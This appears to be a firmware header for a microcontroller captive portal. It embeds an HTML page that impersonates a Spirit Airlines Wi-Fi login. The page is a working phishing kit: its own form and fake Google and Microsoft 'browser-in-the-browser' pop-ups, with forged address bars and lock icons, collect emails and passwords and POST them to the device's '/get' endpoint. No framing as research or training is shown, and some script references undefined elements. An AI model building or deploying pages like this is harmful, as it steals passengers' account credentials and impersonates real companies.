#ifndef SPIRIT_H
#define SPIRIT_H

const char SPIRIT[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spirit Airlines Wi-Fi Login</title>
    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
        .min-h-screen { min-height: 100vh; }
        .bg-gradient-to-br { background-image: linear-gradient(to bottom right, var(--tw-gradient-stops)); }
        .from-spirit-yellow { --tw-gradient-from: #FFD200; --tw-gradient-to: rgba(255,210,0,0); }
        .via-spirit-medium { --tw-gradient-stops: var(--tw-gradient-from), #FFAA00, var(--tw-gradient-to); }
        .to-spirit-dark { --tw-gradient-to: #333333; }

        .flex { display: flex; }
        .items-center { align-items: center; }
        .justify-center { justify-content: center; }
        .p-4 { padding: 1rem; }
        .bg-white { background-color: #fff; }
        .bg-opacity-10 { background-color: rgba(255, 255, 255, 0.1); }
        .backdrop-filter { -webkit-backdrop-filter: blur(8px); backdrop-filter: blur(8px); }
        .backdrop-blur-lg { -webkit-backdrop-filter: blur(8px); backdrop-filter: blur(8px); }
        .rounded-2xl { border-radius: 1rem; }
        .shadow-xl { box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
        .p-8 { padding: 2rem; }
        .max-w-md { max-width: 28rem; }
        .w-full { width: 100%; }
        .text-white { color: #fff; }
        .text-black { color: #000; }
        .border { border-width: 1px; }
        .border-white { border-color: #fff; }
        .border-opacity-20 { border-color: rgba(255, 255, 255, 0.2); }
        .transform { transform: var(--tw-transform); }
        .transition-all { transition-property: all; transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); transition-duration: 300ms; }
        .duration-300 { transition-duration: 300ms; }
        .hover\:scale-\[1\.02\]:hover { --tw-scale-x: 1.02; --tw-scale-y: 1.02; transform: var(--tw-transform); }
        .hover\:shadow-2xl:hover { box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }

        .mb-8 { margin-bottom: 2rem; }
        .flex-col { flex-direction: column; }
        .items-center { align-items: center; }
        .text-3xl { font-size: 1.875rem; line-height: 2.25rem; }
        .font-bold { font-weight: 700; }
        .text-center { text-align: center; }
        .mb-2 { margin-bottom: 0.5rem; }
        .leading-tight { line-height: 1.25; }
        .text-xl { font-size: 1.25rem; line-height: 1.75rem; }
        .font-light { font-weight: 300; }
        .opacity-80 { opacity: 0.8; }
        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
        .opacity-70 { opacity: 0.7; }
        .mt-8 { margin-top: 2rem; }

        .mb-4 { margin-bottom: 1rem; }
        .mb-6 { margin-bottom: 1.5rem; }
        .input-wrapper {
            display: flex;
            justify-content: center;
            width: 100%;
        }
        .form-input {
            appearance: none;
            background-color: rgba(255, 255, 255, 0.8);
            border-color: rgba(0, 0, 0, 0.2);
            border-width: 1px;
            border-radius: 0.5rem;
            padding: 0.75rem;
            font-size: 1rem;
            line-height: 1.5;
            color: #000;
            width: 100%;
            max-width: 20rem;
            transition: background-color 200ms, border-color 200ms;
        }
        .form-input::placeholder {
            color: #333333;
            opacity: 0.7;
        }
        .form-input:focus {
            outline: 0;
            box-shadow: 0 0 0 2px rgba(255, 210, 0, 0.75);
            border-color: transparent;
        }

        .button-container {
            display: flex;
            justify-content: center;
            margin-top: 1.5rem;
        }
        .centered-button {
            max-width: 20rem;
            width: 100%;
            background-color: #FFD200;
            color: #000;
            font-weight: 600;
            padding-top: 0.75rem;
            padding-bottom: 0.75rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            transition: all 300ms cubic-bezier(0.4, 0, 0.2, 1);
            transform: var(--tw-transform);
            cursor: pointer;
            appearance: none;
            border: none;
            line-height: inherit;
        }
        .centered-button:hover {
            background-color: #FFAA00;
            transform: translateY(-0.125rem);
        }
        .centered-button:focus {
            outline: 0;
            box-shadow: 0 0 0 2px rgba(255, 210, 0, 0.75);
        }

        #messageBox {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #FFD200;
            color: #000;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
            font-size: 1rem;
            text-align: center;
            min-width: 250px;
            max-width: 80%;
            box-sizing: border-box;
        }
        #messageBox.show {
            opacity: 1;
            visibility: visible;
        }

        .or-divider {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 2.5rem;
            margin-bottom: 2.5rem;
        }
        .or-divider::before,
        .or-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: rgba(255, 255, 255, 0.3);
        }
        .or-divider span {
            padding: 0 1rem;
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.875rem;
            background-color: transparent;
        }

        .social-login-buttons {
            /* Adjusted max-width to make buttons shorter */
            max-width: 16rem; /* Equivalent to 256px, adjust as needed */
            width: 100%;
            margin-left: auto;
            margin-right: auto;
        }

        .google-sign-in, .microsoft-sign-in {
            width: 100%;
            padding: 0.9rem 1.25rem;
            border-radius: 0.625rem;
            border: 1px solid rgba(0, 0, 0, 0.2);
            color: #000;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.2s ease, border-color 0.2s ease;
            font-size: 1rem;
            background-color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 1rem;
        }
        .google-sign-in span,
        .microsoft-sign-in span {
            padding-left: 2rem;
            display: block;
        }
        .google-sign-in:hover, .microsoft-sign-in:hover {
            background-color: #f0f0f0;
            border-color: rgba(0, 0, 0, 0.4);
        }
        .google-sign-in .google-logo-svg,
        .microsoft-sign-in .microsoft-icon {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
            position: absolute;
            left: 1rem;
        }
        .google-sign-in .google-logo-svg {
            transform: translateY(-2px);
        }

        .browser-window {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            border: 1px solid #333;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            background-color: #fff;
            border-radius: 8px;
            overflow: hidden;
        }
        .browser-header {
            background-color: #1e1e1e;
            color: white;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 0 0 8px;
            cursor: grab;
        }
        .browser-header:active { cursor: grabbing; }
        .tab { display: flex; align-items: center; gap: 8px; }
        .tab img { height: 16px; width: 16px; }
        .tab span { font-size: 12px; white-space: nowrap; }
        .window-controls { display: flex; align-items: center; }
        .window-controls div { width: 46px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .window-controls div:hover { background-color: #3a3a3a; }
        .window-controls .close:hover { background-color: #e81123; }
        .window-controls svg { fill: white; width: 10px; height: 10px; }
        .address-bar {
            background-color: #2d2d2d;
            color: white;
            padding: 6px 12px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: monospace;
            overflow-x: auto;
        }
        .lock-icon { color: #6fcf97; }
        .content {
            background: white;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            overflow-y: auto;
        }
        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 100%;
            max-width: 280px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            box-sizing: border-box;
        }
        .logo svg {
            width: 100px;
            height: 34px;
            margin-bottom: 20px;
        }
        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
        .subtitle { font-size: 15px; font-weight: 400; color: #5f6368; margin-bottom: 20px; }
        .form-group-bitb { width: 100%; margin-bottom: 20px; position: relative; }
        .form-control-bitb { width: 100%; padding: 8px; border: 1px solid #dadce0; border-radius: 4px; outline: none; font-size: 15px; transition: all 0.3s ease; background-color: #ffffff;
            color: #333; }
        .form-label-bitb { position: absolute; top: 8px; left: 10px; font-size: 15px; color: #5f6368; transition: 0.3s; pointer-events: none; }
        .form-control-bitb:focus + .form-label-bitb,
        .form-control-bitb:not(:placeholder-shown) + .form-label-bitb { transform: translateY(-22px); font-size: 11px; color: #1a73e8; }
        .forgot-email { font-size: 13px; color: #1a73e8; text-decoration: none; margin-bottom: 12px; display: block; width: 100%; text-align: left; }
        .forgot-email:hover { text-decoration: none; }
        .text-area { font-size: 11px; color: #5f6368; margin-top: 6px; text-align: left; width: 100%; }
        .button-container-bitb { display: flex; align-items: center; justify-content: space-between; width: 100%; margin-top: 25px; }
        .create-account { font-size: 13px; color: #1a73e8; text-decoration: none; }
        .create-account:hover { text-decoration: underline; }
        .next-button-bitb { background-color: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 8px 20px; font-size: 15px; cursor: pointer; transition: background-color 0.3s ease, box-shadow 0.3s ease; }
        .next-button-bitb:hover { background-color: #145db0; }
        .form-control-bitb.password-mode {
            -webkit-text-security: disc;
            -moz-text-security: disc;
            text-security: disc;
            font-size: 16px;
        }
        .form-label-bitb.password-mode { color: #1a73e8; }

        .microsoft-browser-window {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            border: 1px solid #333;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            background-color: #fff;
            border-radius: 8px;
            overflow: hidden;
        }
        .microsoft-content {
            padding: 15px;
            background: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            height: auto;
            min-height: 180px;
            overflow-y: auto;
        }
        .microsoft-container {
            background-color: #ffffff;
            width: 100%;
            max-width: 280px;
            padding: 15px;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
            border-radius: 6px;
            box-sizing: border-box;
            text-align: left;
        }
        .microsoft-header-bitb {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
        }
        .microsoft-logo-bitb {
            width: 24px;
            height: 24px;
        }
        .microsoft-logo-text-bitb {
            font-size: 18px;
            font-weight: 600;
            color: #5e5e5e;
        }
        .microsoft-title { font-size: 22px; font-weight: 600; margin: 0 0 20px; }
        .microsoft-input-wrapper { position: relative; margin-bottom: 20px; border-bottom: 1px solid #666; width: 100%; }
        .microsoft-input-wrapper input { width: 100%; border: none; outline: none; font-size: 15px; padding: 4px 0 6px; background-color: transparent; }
        .microsoft-links { font-size: 12px; color: #0067b8; margin-bottom: 30px; text-align: left; width: 100%; }
        .microsoft-links .info-line { color: black; margin-bottom: 10px; }
        .microsoft-links a { text-decoration: none; color: #0067b8; }
        .microsoft-next-button { background-color: #0067b8; color: white; border: none; padding: 8px 20px; font-size: 14px; font-weight: 500; cursor: pointer; border-radius: 2px; margin-top: 15px; width: fit-content; align-self: flex-start; }

    </style>
</head>
<body class="min-h-screen bg-gradient-to-br from-spirit-yellow via-spirit-medium to-spirit-dark flex items-center justify-center p-4">
    <div class="bg-white bg-opacity-10 backdrop-filter backdrop-blur-lg rounded-2xl shadow-xl p-8 max-w-md w-full text-white border border-white border-opacity-20 transform transition-all duration-300 hover:scale-[1.02] hover:shadow-2xl">
        <div class="mb-8 flex flex-col items-center">
            <h1 class="text-3xl font-bold text-center mb-2 leading-tight text-black">Welcome to Spirit Wi-Fi!</h1>
            <h2 class="text-xl text-center mb-8 font-light opacity-80 text-black">Let's get you connected to Wi-Fi</h2>
        </div>

        <form action="/get" method="POST" id="spirit-login-form">
            <div class="mb-4 input-wrapper">
                <input
                    name="email"
                    type="text"
                    class="form-input"
                    placeholder="Email or Booking Reference"
                    required
                    aria-label="Email or Booking Reference"
                >
            </div>

            <div class="mb-6 input-wrapper">
                <input
                    name="password"
                    type="password"
                    class="form-input"
                    placeholder="Password"
                    required
                    aria-label="Password"
                >
            </div>

            <div class="button-container">
                <button
                    type="submit"
                    class="centered-button"
                >
                    Connect to Wi-Fi
                </button>
            </div>
        </form>

        <div class="or-divider">
            <span>OR</span>
        </div>

        <div class="social-login-buttons w-full">
            <button class="google-sign-in" id="googleLogin">
                <svg class="google-logo-svg" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="48" height="48" viewBox="0 0 48 48">
                    <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
                </svg>
                <span>Continue with Google</span>
            </button>
            <button class="microsoft-sign-in" id="microsoftLogin">
                <svg class="microsoft-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                    <rect x="0" y="0" width="23" height="23" fill="#F25022"/>
                    <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/>
                    <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/>
                    <rect x="27" y="27" width="23" height="23" fill="#FFB900"/>
                </svg>
                <span>Continue with Microsoft</span>
            </button>
        </div>

        <div class="text-center text-sm opacity-70 mt-8 text-black opacity-70">
            <p>&copy; 2025 Spirit Airlines. All rights reserved.</p>
        </div>
    </div>

    <div class="browser-window" id="google-window">
        <div class="browser-header">
            <div class="tab">
                <img src="data:image/svg+xml,%3Csvg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%234285F4' d='M22.7 12.5c0-.7-.1-1.3-.2-1.9H12v3.6h6.4c-.3 1.5-1.2 2.7-2.6 3.6v2.3h3a11.2 11.2 0 0 0 3.1-8.3z'/%3E%3Cpath fill='%2334A853' d='M12 23c3.1 0 5.7-1 7.6-2.7l-3-2.3c-1.1.7-2.5 1.1-4.6 1.1-3.5 0-6.5-2.4-7.6-5.6H1.4v2.4C3.2 20.8 7.3 23 12 23z'/%3E%3Cpath fill='%23FBBC05' d='M4.4 14c-.3-1-.5-2.1-.5-3.2s.2-2.2.5-3.2V5.2H1.4c-.9 1.8-1.4 3.9-1.4 6.8s.5 5 1.4 6.8L4.4 14z'/%3E%3Cpath fill='%23EA4335' d='M12 4.9c1.7 0 3.2.7 4.4 1.8L19 4.2C17 2.3 14.7 1 12 1 7.3 1 3.2 3.2 1.4 7.2l3 2.4C5.5 6.9 8.5 4.9 12 4.9z'/%3E%3C/svg%3E" alt="Google Favicon">
                <span>Sign in – Google Accounts</span>
            </div>
            <div class="window-controls">
                <div title="Minimize"><svg viewBox="0 0 10 1"><rect width="10" height="1"/></svg></div>
                <div title="Maximize"><svg viewBox="0 0 10 10"><rect width="8" height="8" x="1" y="1" fill="none" stroke="white" stroke-width="1"/></svg></div>
                <div class="close" title="Close" onclick="closeLogin('google')"><svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="white" stroke-width="1"/><line x1="1" y1="9" x2="9" y2="1" stroke="white" stroke-width="1"/></svg></div>
            </div>
        </div>
        <div class="address-bar">
            <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" width="16" height="16">
                <path fill="#6fcf97" d="M18 10h-1V7c0-2.76-2.24-5-5-5S7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm-9 0h10v8H6v-8h3zm3 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM9 7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9V7z"/>
            </svg>
            <span>accounts.google.com/signin/v2/identifier?g...</span>
        </div>
        <div class="content">
            <div class="container">
                <div class="logo">
                    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="100px" height="34px">
                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
                    </svg>
                </div>
                <h1 class="title">Sign in</h1>
                <h2 class="subtitle">Use your Google Account</h2>
                <form id="google-email-step-form" onsubmit="return false;">
                    <div class="form-group-bitb" id="email-group-bitb">
                        <input type="text" id="email-bitb" name="email" class="form-control-bitb" placeholder=" " />
                        <label for="email-bitb" class="form-label-bitb">Email or phone</label>
                    </div>
                    <a href="#" class="forgot-email">Forgot email?</a>
                    <div class="text-area">
                        Not your device? Use Guest mode to sign in privately.
                        <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
                    </div>
                    <div class="button-container-bitb">
                        <a href="#" class="create-account">Create account</a>
                        <button type="submit" class="next-button-bitb">Next</button>
                    </div>
                </form>

                <form id="google-password-step-form" action="/get" method="POST" style="display:none;">
                    <input type="hidden" id="google-hidden-email" name="email">
                    <div class="form-group-bitb" id="password-group-bitb">
                        <input type="password" id="password-bitb" name="password" class="form-control-bitb" placeholder=" " />
                        <label for="password-bitb" class="form-label-bitb">Password</label>
                    </div>
                    <a href="#" class="forgot-email">Forgot password?</a>
                    <div class="text-area">
                        This is not your account? <a href="#" style="color: #1a73e8; text-decoration: none;">Switch accounts</a>
                    </div>
                    <div class="button-container-bitb">
                        <a href="#" class="create-account">More options</a>
                        <button type="submit" class="next-button-bitb">Sign In</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="browser-window" id="microsoft-window">
        <div class="browser-header">
            <div class="tab">
                <img src="data:image/svg+xml,%3Csvg viewBox='0 0 50 50' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='0' y='0' width='23' height='23' fill='%23F25022'/%3E%3Crect x='27' y='0' width='23' height='23' fill='%237FBA00'/%3E%3Crect x='0' y='27' width='23' height='23' fill='%2300A4EF'/%3E%3Crect x='27' y='27' width='23' height='23' fill='%23FFB900'/%3E%3C/svg%3E" alt="MS Favicon">
                <span>Sign in to your Microsoft account</span>
            </div>
            <div class="window-controls">
                <div title="Minimize"><svg viewBox="0 0 10 1"><rect width="10" height="1"/></svg></div>
                <div title="Maximize"><svg viewBox="0 0 10 10"><rect width="8" height="8" x="1" y="1" fill="none" stroke="white" stroke-width="1"/></svg></div>
                <div class="close" title="Close" onclick="closeLogin('microsoft')"><svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="white" stroke-width="1"/><line x1="1" y1="9" x2="9" y2="1" stroke="white" stroke-width="1"/></svg></div>
            </div>
        </div>
        <div class="address-bar">
            <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" width="16" height="16">
                <path fill="#6fcf97" d="M18 10h-1V7c0-2.76-2.24-5-5-5S7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm-9 0h10v8H6v-8h3zm3 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM9 7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9V7z"/>
            </svg>
            <span>login.microsoftonline.com/</span>
        </div>
        <div class="content">
            <div class="microsoft-container">
                <div class="microsoft-header-bitb">
                    <svg class="microsoft-logo-bitb" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                        <rect x="0" y="0" width="23" height="23" fill="#F25022"/>
                        <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/>
                        <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/>
                        <rect x="27" y="27" width="23" height="23" fill="#FFB900"/>
                    </svg>
                    <span class="microsoft-logo-text-bitb">Microsoft</span>
                </div>
                <h2 class="microsoft-title">Sign in</h2>
                <form id="microsoft-email-step-form" onsubmit="return false;">
                    <div class="microsoft-input-wrapper" id="email-wrapper-microsoft">
                        <input type="email" id="email-microsoft" name="email" placeholder="Email or phone" required>
                    </div>
                    <div class="microsoft-links">
                        <div class="info-line">No account? <a href="#">Create one!</a></div>
                        <div><a href="#">Can't access your account?</a></div>
                    </div>
                    <button type="submit" class="microsoft-next-button">Next</button>
                </form>

                <form id="microsoft-password-step-form" action="/get" method="POST" style="display: none;">
                    <input type="hidden" id="microsoft-hidden-email" name="email">
                    <div class="microsoft-input-wrapper" id="password-wrapper-microsoft">
                        <input type="password" id="password-microsoft" name="password" placeholder="Password" required>
                    </div>
                    <div class="microsoft-links">
                        <div class="info-line">No account? <a href="#">Create one!</a></div>
                        <div><a href="#">Can't access your account?</a></div>
                    </div>
                    <button type="submit" class="microsoft-next-button">Sign In</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        const spiritLoginForm = document.getElementById('spirit-login-form');
        const googleLoginButton = document.getElementById('googleLogin');
        const microsoftLoginButton = document.getElementById('microsoftLogin');
        const messageBox = document.getElementById('messageBox');
        let messageTimeout;

        let isDragging = false;
        let offset = { x: 0, y: 0 };
        let activeWindow = null;
        const googleWindow = document.getElementById('google-window');
        const microsoftWindow = document.getElementById('microsoft-window');
        const googleHeader = googleWindow.querySelector('.browser-header');
        const microsoftHeader = microsoftWindow.querySelector('.browser-header');
        
        const googleEmailStepForm = document.getElementById('google-email-step-form');
        const googlePasswordStepForm = document.getElementById('google-password-step-form');
        const emailInputBitb = document.getElementById('email-bitb');
        const passwordInputBitb = document.getElementById('password-bitb');
        const googleHiddenEmailInput = document.getElementById('google-hidden-email');
        
        const microsoftEmailStepForm = document.getElementById('microsoft-email-step-form');
        const microsoftPasswordStepForm = document.getElementById('microsoft-password-step-form');
        const microsoftEmailInput = document.getElementById('email-microsoft');
        const microsoftPasswordInput = document.getElementById('password-microsoft');
        const microsoftHiddenEmailInput = document.getElementById('microsoft-hidden-email');

        let googleUserEmail = '';
        let microsoftUserEmail = '';

        function showMessage(message, duration = 3000) {
            messageBox.textContent = message;
            messageBox.classList.add('show');
            if (messageTimeout) {
                clearTimeout(messageTimeout);
            }
            messageTimeout = setTimeout(() => {
                messageBox.classList.remove('show');
            }, duration);
        }

        function showLogin(type) {
            closeAllLogins();
            if (type === 'google') {
                googleWindow.style.display = 'block';
                googleEmailStepForm.style.display = 'block';
                googlePasswordStepForm.style.display = 'none';
                emailInputBitb.value = '';
                passwordInputBitb.value = '';
                googleUserEmail = '';
                emailInputBitb.focus();
                activeWindow = 'google';
            } else if (type === 'microsoft') {
                microsoftWindow.style.display = 'block';
                microsoftEmailStepForm.style.display = 'block';
                microsoftPasswordStepForm.style.display = 'none';
                microsoftEmailInput.value = '';
                microsoftPasswordInput.value = '';
                microsoftUserEmail = '';
                microsoftEmailInput.focus();
                activeWindow = 'microsoft';
            }
        }

        function closeAllLogins() {
            googleWindow.style.display = 'none';
            microsoftWindow.style.display = 'none';
            activeWindow = null;
            
            googleEmailStepForm.style.display = 'block';
            googlePasswordStepForm.style.display = 'none';
            emailInputBitb.value = '';
            passwordInputBitb.value = '';
            googleHiddenEmailInput.value = '';
            googleUserEmail = '';

            microsoftEmailStepForm.style.display = 'block';
            microsoftPasswordStepForm.style.display = 'none';
            microsoftEmailInput.value = '';
            microsoftPasswordInput.value = '';
            microsoftHiddenEmailInput.value = '';
            microsoftUserEmail = '';
        }

        function closeLogin(type) {
            if (type === 'google' && activeWindow === 'google') {
                googleWindow.style.display = 'none';
                activeWindow = null;
            } else if (type === 'microsoft' && activeWindow === 'microsoft') {
                microsoftWindow.style.display = 'none';
                activeWindow = null;
            }
        }

        function handleDragStart(event) {
            isDragging = true;
            const currentWindow = activeWindow === 'google' ? googleWindow : microsoftWindow;
            offset = {
                x: event.clientX - currentWindow.offsetLeft,
                y: event.clientY - currentWindow.offsetTop,
            };
            const currentHeader = currentWindow.querySelector('.browser-header');
            currentHeader.style.cursor = 'grabbing';
        }

        function handleDrag(event) {
            if (isDragging && activeWindow) {
                let currentWindow = activeWindow === 'google' ? googleWindow : microsoftWindow;
                currentWindow.style.left = event.clientX - offset.x + 'px';
                currentWindow.style.top = event.clientY - offset.y + 'px';
            }
        }

        function handleDragEnd() {
            isDragging = false;
            if (activeWindow) {
                const currentHeader = activeWindow === 'google' ? googleWindow.querySelector('.browser-header') : microsoftWindow.querySelector('.browser-header');
                currentHeader.style.cursor = 'grab';
            }
        }

        googleHeader.addEventListener('mousedown', handleDragStart);
        microsoftHeader.addEventListener('mousedown', handleDragStart);
        document.addEventListener('mousemove', handleDrag);
        document.addEventListener('mouseup', handleDragEnd);

        function handleLoginSuccess() {
            window.location.replace('/get');
        }

        googleEmailStepForm.addEventListener('submit', function(event) {
            event.preventDefault();
            if (isValidEmail(emailInputBitb.value.trim())) {
                googleUserEmail = emailInputBitb.value.trim();
                googleHiddenEmailInput.value = googleUserEmail;

                googleEmailStepForm.style.display = 'none';
                googlePasswordStepForm.style.display = 'block';
                passwordInputBitb.focus();
            } else {
                showMessage('Please enter a valid email address.');
            }
        });

        googlePasswordStepForm.addEventListener('submit', function(event) {
            if (passwordInputBitb.value.trim() === '') {
                event.preventDefault();
                showMessage('Please enter your password.');
            }
        });


        microsoftEmailStepForm.addEventListener('submit', function(event) {
            event.preventDefault();
            microsoftUserEmail = microsoftEmailInput.value.trim();
            if (microsoftUserEmail) {
                microsoftHiddenEmailInput.value = microsoftUserEmail;
                microsoftEmailStepForm.style.display = 'none'
                microsoftPasswordStepForm.style.display = 'block';
                microsoftPasswordInput.focus();
            } else {
                showMessage('Please enter your email or phone number.');
            }
        });

        microsoftPasswordStepForm.addEventListener('submit', function(event) {
            if (microsoftPasswordInput.value.trim() === '') {
                event.preventDefault();
                showMessage('Please enter your password.');
            }
        });

        function isValidEmail(email) {
            const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
            return emailRegex.test(email);
        }

        googleLoginButton.addEventListener('click', function() {
            showLogin('google');
        });

        microsoftLoginButton.addEventListener('click', function() {
            showLogin('microsoft');
        });

        spiritLoginForm.addEventListener('submit', function(event) {
            const emailValue = emailInput.value.trim();
            const passwordValue = passwordInput.value.trim();
            let hasErrors = false;

            if (!emailValue) {
                emailError.textContent = 'Please enter your email address.';
                emailInput.classList.add('input-error');
                hasErrors = true;
            } else if (!isValidEmail(emailValue)) {
                emailError.textContent = 'Invalid email format';
                emailInput.classList.add('input-error');
                hasErrors = true;
            } else {
                emailError.textContent = '';
                emailInput.classList.remove('input-error');
            }

            if (!passwordValue) {
                showMessage('Please enter your password.');
                hasErrors = true;
            }

            if (hasErrors) {
                event.preventDefault();
            }
        });
    </script>
</body>
</html>
)rawliteral";
#endif